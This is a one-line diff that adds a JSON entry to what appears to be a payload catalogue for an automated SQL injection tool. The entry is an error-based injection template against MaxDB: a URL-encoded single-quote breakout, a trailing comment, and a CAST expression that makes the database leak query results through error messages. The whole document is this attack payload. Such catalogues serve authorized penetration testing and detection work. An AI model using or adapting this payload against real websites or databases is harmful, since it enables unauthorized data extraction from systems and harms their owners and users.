@@ -1,0 +1,1 @@
+{"dbms": "maxdb", "technique": "error", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=CAST(({Q}) AS INT)", "comment": "maxdb error: url-enc single"}
